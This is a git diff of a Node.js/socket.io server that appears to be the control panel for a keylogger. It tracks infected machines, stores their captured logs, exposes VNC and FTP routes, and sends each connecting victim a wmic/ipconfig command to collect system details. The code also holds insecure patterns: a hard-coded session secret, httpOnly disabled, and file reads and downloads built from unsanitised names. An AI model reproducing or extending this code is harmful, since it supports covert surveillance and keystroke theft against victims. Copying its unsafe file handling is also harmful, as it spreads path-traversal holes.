@@ -4,9 +4,11 @@ const socketio = require("socket.io");
 const fs = require("fs");
 const app = express();
 const render = require("./js/views.js");
-const fileUpload = require('express-fileupload');
+const client = require("./js/client.js");
+const settings = require("./js/settings.js");
+const utils = require("./js/utils.js");
 
-//const sharp = require("sharp");
+const fileUpload = require('express-fileupload');
 
 const server = app.listen(3000, function () {
   console.log("App listening on port 3000!");
@@ -18,27 +20,24 @@ const io = socketio(server, {
     origin: "*", // for browser extension
   },
 });
-let clients = [];
+
+settings.read();
+console.log(settings.getAll())
 
 
+function getOfflineClients(){
 
-const getOfflineClients = () => {
-  var c = [];
 
-  fs.readdirSync("./clients").forEach((file) => {
-    c.push(file);
+  fs.readdirSync("./clients").forEach((name) => {
+    client.addClient(name);
     //console.log(file);
   });
-  return c;
+  console.table(client.getAllClients());
+
 }
 
-let offlineclients = getOfflineClients();
+getOfflineClients();
 var delay = 10;
-var fps = 0;
-// setInterval(() => {
-//   console.log(`FPS: ${fps}`);
-//   fps = 0;
-// }, 1000);
 
 app.use(express.json());
 
@@ -58,10 +57,11 @@ app.set("view engine", "ejs");
 app.use(
   session({
     secret: "test",
-    resave: true,
-    saveUninitialized: true,
+    resave: false,
+    saveUninitialized: false,
     cookie: {
       secure: false,
+      httpOnly: false,
       maxAge: 7200000,
     }, //Remember to set it to true!
 
@@ -71,108 +71,21 @@ app.use(
 
 app.get("/", render.loginPage); //Render main page with login and register etc.
 
-app.get("/dashboard", render.dashboard);
-//Render dashboard page
-app.get("/settings", render.settings); //Render dashboard page
-
 app.post("/", render.login);
+
+app.get("/dashboard", render.dashboard);
+
+app.get("/settings", render.settings); 
+
+app.post("/settings", render.change_settings); 
 
 app.get("/vnc/:ClientName/:ClientId", render.vncclient);
 
+app.get("/ftp/:FileName?", render.ftp);
 
+app.post("/ftp", render.ftp_upload);
 
-app.get("/ftp/:FileName?", (req, res) => {
-  if (req.params.FileName == null) {
-    if (req.session.isLogged) {
-      var files = fs.readdirSync("./ftp");
-      var sizes = [];
-
-      files.forEach(function(file){
-        sizes.push(getFilesize(`./ftp/${file}`))
-      })
-      console.log(sizes);
-      res.render("ftp", {
-        isLogged: req.session.isLogged,
-        username: req.session.username,
-        files: files,
-        sizes: sizes,
-      });
-    } else res.render("index");
-  } else {
-    res.download("ftp/" + req.params.FileName, function (err) {
-      if (err) {
-        console.log(err);
-      }
-    });
-  } 
-});
-
-app.post("/ftp", (req, res) => {
-  //fs.appendFileSync("./ftp/" + "test", req.)
-
-  console.log(req.files)
-  if (!req.files || Object.keys(req.files).length === 0) {
-    return res.status(400).send('No files were uploaded.');
-  }
-
-  // The name of the input field (i.e. "sampleFile") is used to retrieve the uploaded file
-  let File = req.files.file;
-
-  // Use the mv() method to place the file somewhere on your server
-  File.mv(`./ftp/${File.name}`, function(err) {
-    if (err)
-      return res.status(500).send(err);
-
-    res.send('File uploaded!');
-  });
-});
-
-app.get("/logs/:ClientName/:FileName?", (req, res) => {
-  const ClientName = req.params.ClientName;
-  const FileName = req.params.FileName;
-  var fileContents;
-  var ext;
-  var sizes = [];
-
-    if (FileName != null) {
-      //Pobiera zawartosc pliku
-      try {
-        ext = FileName.split(".")
-          .filter(Boolean) // removes empty extensions (e.g. `filename...txt`)
-          .slice(1)
-          .join(".");
-        if (ext == "txt") {
-          fileContents = fs
-            .readFileSync(`./clients/${ClientName}/${FileName}`)
-            .toString();
-        } else {
-          fileContents = fs.readFileSync(
-            `./clients/${ClientName}/${FileName}`,
-            "base64"
-          );
-        }
-      } catch (err) {}
-    } else {
-      fileContents = fs.readdirSync(`./clients/${ClientName}`);
-      fileContents.forEach(function(file){
-        sizes.push(getFilesize(`./clients/${ClientName}/${file}`))
-      })
-    }
-
-
-  //Render log
-  if (req.session.isLogged) {
-    res.render("log", {
-      content: fileContents,
-      clientname: ClientName,
-      filename: FileName,
-      isLogged: req.session.isLogged,
-      username: req.session.username,
-      sizes: sizes,
-      type: ext,
-    });
-  } else res.render("index");
-});
+app.get("/logs/:ClientName/:FileName?", render.logs);
 
 app.post("/logout", render.logout);
 
@@ -201,7 +114,6 @@ io.on("connection", (socket) => {
     socket.joined = false;
     socket.version = msg;  //-- for client version 1.1
 
-    console.log("Dolaczono: " + socket.name + " " + socket.ip);
     socket.emit("command", 'wmic computersystem get name, TotalPhysicalMemory /Value && wmic os get caption /Value && ipconfig | find "IPv4" | find /N ":"  | find "[1]"');
   });
 
@@ -262,7 +174,7 @@ io.on("connection", (socket) => {
       recursive: true,
       force: true,
     });
-    offlineclients.splice(offlineclients.indexOf(msg.clientname), 1);
+    client.removeClient(msg.clientname);
   });
   socket.on("delete-ftp", async (msg) => {
     fs.rmSync(`./ftp/${msg.filename}`, {
@@ -272,12 +184,9 @@ io.on("connection", (socket) => {
   socket.on("disconnect", () => {
     if (socket.name != null) {
       //if socket is a keylogger instance
-      console.log("Wyszedl: " + socket.name + " " + socket.ip);
+      console.log("Wyszedl: " + socket.name);
 
-      removeById(clients, socket.id);
-      if(!offlineclients.includes(socket.name))
-        offlineclients.push(socket.name);
-      //offlineclients.push(socket.name);
+      client.getClientByName(socket.name).status = false;
       io.emit("leave", {name: socket.name})
 
     }
@@ -285,40 +194,52 @@ io.on("connection", (socket) => {
 });
 
 function parseClientInfo(decodedString, socket) {
+  let ram = '';
+  let osName = '';
+  let ip = '';
   const outputLines = decodedString.split("\n");
-  const osNameLine = outputLines.find((line) => line.startsWith("Caption="));
-  const osName = osNameLine.split("=")[1].trim();
+
+
   const hostNameLine = outputLines.find((line) =>
-    line.startsWith("Name=")
-  );
+  line.startsWith("Name="));
   const hostName = hostNameLine.split("=")[1].trim();
-  const ramLine = outputLines.find((line) =>
-    line.startsWith("TotalPhysicalMemory=")
-  );
-  const ram = formatBytes(parseInt(ramLine.split("=")[1].trim()))
-  const ipLine = outputLines.find((line) =>
-  line.startsWith("[1]")
-);
-const ip = ipLine.split(":")[1].trim()
 
+  try {
+    const osNameLine = outputLines.find((line) => line.startsWith("Caption="));
+    osName = osNameLine.split("=")[1].trim();
+  } catch (e) {}
 
+  try{
+    const ipLine = outputLines.find((line) => line.startsWith("[1]"));
+    ip = ipLine.split(":")[1].trim()
+  } catch(e){}
+
+  try{
+  const ramLine = outputLines.find((line) =>line.startsWith("TotalPhysicalMemory="));
+  ram = utils.formatBytes(parseInt(ramLine.split("=")[1].trim()))
+  } catch (e){}
   
-  //const ipAddress = decodedString.match(/IP address[^:]+: (.*)/)[1];
-  socket.name = hostName;
-  clients.push({
-    id: socket.id,
-    name: hostName,
-    ip: ip,
-    ram: ram,
-    version: socket.version,
-    system: osName,
-  });
-  checkDirectoryExists(socket.name);
-
-  let index = offlineclients.indexOf(socket.name);
-  if (index > -1) {
-    offlineclients.splice(index, 1);
+  if(client.hasClient(hostName) && client.getClientByName(hostName).status == true){
+    socket.disconnect();
+    return
   }
+  socket.name = hostName;
+
+  checkDirectoryExists(socket.name);
+ 
+  if(!client.hasClient(hostName)){
+    client.addClient(hostName, true);
+  } 
+  emmet = client.getClientByName(hostName)
+  emmet.status = true;
+  emmet.ip = ip;
+  emmet.ram = ram;
+  emmet.version = socket.version;
+  emmet.system = osName;
+  emmet.id = socket.id;
+
+  console.table(client.getAllClients());
+
   io.emit("join", {name: socket.name})
 }
 
@@ -339,33 +260,5 @@ function writeToFile(clientname, msg) {
   fs.appendFileSync(`./clients/${clientname}/${dformat}.txt`, msg + "\n");
 }
 
-const removeById = (arr, id) => {
-  const requiredIndex = arr.findIndex((el) => {
-    return el.id === String(id);
-  });
-  if (requiredIndex === -1) {
-    return false;
-  }
-  return !!arr.splice(requiredIndex, 1);
-};
-function formatBytes(bytes, decimals = 2) {
-  if (!+bytes) return '0 Bytes'
-
-  const k = 1024
-  const dm = decimals < 0 ? 0 : decimals
-  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB']
-
-  const i = Math.floor(Math.log(bytes) / Math.log(k))
-
-  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`
-}
-function getFilesize(path) {
-  var stats = fs.statSync(path);
-  var bytes = stats.size;
 
 
-  return formatBytes(bytes)
-}
-
-exports.clients = clients;
-exports.offlineclients = offlineclients;
